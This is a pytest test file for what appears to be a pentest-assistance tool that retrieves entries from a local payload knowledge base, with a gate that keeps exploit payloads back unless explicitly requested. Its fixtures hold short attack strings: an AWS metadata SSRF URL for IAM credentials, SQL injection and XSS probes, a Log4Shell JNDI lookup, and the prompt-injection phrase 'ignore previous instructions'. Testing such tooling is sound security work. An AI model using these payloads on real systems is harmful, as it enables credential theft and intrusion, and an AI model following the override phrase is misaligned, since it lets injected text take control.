from __future__ import annotations

from pathlib import Path

from pytest import MonkeyPatch

from app.services.pattt_catalog import build_pattt_catalog
from app.services.pattt_context import resolve_pattt_context


def _write_text(path: Path, content: str) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(content.strip() + "\n", encoding="utf-8")


def _build_pattt_fixture(base_path: Path, monkeypatch: MonkeyPatch) -> Path:
    pattt_root = base_path / "knowledge" / "pattt"
    monkeypatch.setenv("AEGISSEC_PATTT_ROOT", str(pattt_root))
    repo_dir = pattt_root / "repo"
    _write_text(
        repo_dir / "Server Side Request Forgery" / "README.md",
        "# SSRF\n## Verification\n- http://169.254.169.254/latest/meta-data/",
    )
    _write_text(
        repo_dir / "Server Side Request Forgery" / "SSRF-Cloud-Instances.md",
        "# SSRF Cloud Instances\n## AWS\n- http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    )
    _write_text(
        repo_dir / "SQL Injection" / "README.md", "# SQL Injection\n## Verification\n- ' OR '1'='1"
    )
    _write_text(
        repo_dir / "SQL Injection" / "MySQL Injection.md",
        "# MySQL Injection\n## Verification\n- UNION SELECT @@version",
    )
    _write_text(
        repo_dir / "XSS Injection" / "README.md",
        "# XSS Injection\n## Verification\n- <script>alert(1)</script>",
    )
    _write_text(
        repo_dir / "XSS Injection" / "4 - CSP Bypass.md",
        "# CSP Bypass\n## Bypass\n- strict-dynamic bypass",
    )
    _write_text(
        repo_dir / "Prompt Injection" / "README.md",
        "# Prompt Injection\n## Verification\n- ignore previous instructions",
    )
    _write_text(
        repo_dir / "CVE Exploits" / "README.md",
        "# CVE Exploits\n## Overview\n- curated exploit notes",
    )
    _write_text(
        repo_dir / "CVE Exploits" / "Log4Shell.md",
        (
            "# Log4Shell\n## Verification\n- ${jndi:ldap://example.com/a}\n"
            "## Exploit\n- reverse shell chain"
        ),
    )
    _write_text(
        repo_dir / "Methodology and Resources" / "AWS Pentest.md",
        "# AWS Pentest\n## Methodology\n- enumerate IMDS",
    )
    _write_text(repo_dir / ".source-commit", "fixture-sha\n")
    build_pattt_catalog(
        repo_dir=repo_dir,
        catalog_dir=pattt_root / "catalog",
        repo_root=base_path,
        source_commit="fixture-sha",
    )
    return pattt_root


def test_ssrf_cloud_metadata_reads_canonical_and_child_doc(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    _build_pattt_fixture(tmp_path, monkeypatch)
    context = resolve_pattt_context(objective="ssrf aws metadata verification", repo_root=tmp_path)
    loaded_paths = [doc.path for doc in context.loaded_docs]
    assert "knowledge/pattt/repo/Server Side Request Forgery/README.md" in loaded_paths
    assert (
        "knowledge/pattt/repo/Server Side Request Forgery/SSRF-Cloud-Instances.md" in loaded_paths
    )


def test_sql_injection_mysql_reads_expected_docs(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    _build_pattt_fixture(tmp_path, monkeypatch)
    context = resolve_pattt_context(
        objective="mysql sql injection verification", repo_root=tmp_path
    )
    loaded_paths = [doc.path for doc in context.loaded_docs]
    assert "knowledge/pattt/repo/SQL Injection/README.md" in loaded_paths
    assert "knowledge/pattt/repo/SQL Injection/MySQL Injection.md" in loaded_paths


def test_xss_csp_reads_expected_docs(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    _build_pattt_fixture(tmp_path, monkeypatch)
    context = resolve_pattt_context(
        objective="xss csp bypass",
        explicit_bypass=True,
        repo_root=tmp_path,
    )
    loaded_paths = [doc.path for doc in context.loaded_docs]
    assert "knowledge/pattt/repo/XSS Injection/README.md" in loaded_paths
    assert "knowledge/pattt/repo/XSS Injection/4 - CSP Bypass.md" in loaded_paths


def test_prompt_injection_reads_readme(tmp_path: Path, monkeypatch: MonkeyPatch) -> None:
    _build_pattt_fixture(tmp_path, monkeypatch)
    context = resolve_pattt_context(objective="prompt injection verification", repo_root=tmp_path)
    assert [doc.path for doc in context.loaded_docs] == [
        "knowledge/pattt/repo/Prompt Injection/README.md"
    ]


def test_log4shell_reads_expected_docs_and_gates_exploit(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    _build_pattt_fixture(tmp_path, monkeypatch)
    verification_context = resolve_pattt_context(
        objective="log4shell verification", repo_root=tmp_path
    )
    loaded_paths = [doc.path for doc in verification_context.loaded_docs]
    assert "knowledge/pattt/repo/CVE Exploits/README.md" in loaded_paths
    assert "knowledge/pattt/repo/CVE Exploits/Log4Shell.md" in loaded_paths
    assert all(
        candidate.candidate_type != "exploit"
        for candidate in verification_context.payload_candidates
    )

    exploit_context = resolve_pattt_context(
        objective="log4shell exploit chain",
        explicit_exploit=True,
        repo_root=tmp_path,
    )
    assert any(
        candidate.candidate_type == "exploit" for candidate in exploit_context.payload_candidates
    )


def test_methodology_collection_supports_standalone_manuals(
    tmp_path: Path, monkeypatch: MonkeyPatch
) -> None:
    _build_pattt_fixture(tmp_path, monkeypatch)
    context = resolve_pattt_context(objective="aws pentest methodology", repo_root=tmp_path)
    assert [doc.path for doc in context.loaded_docs] == [
        "knowledge/pattt/repo/Methodology and Resources/AWS Pentest.md"
    ]
    assert all(
        candidate.source_path == "knowledge/pattt/repo/Methodology and Resources/AWS Pentest.md"
        for candidate in context.payload_candidates
    )
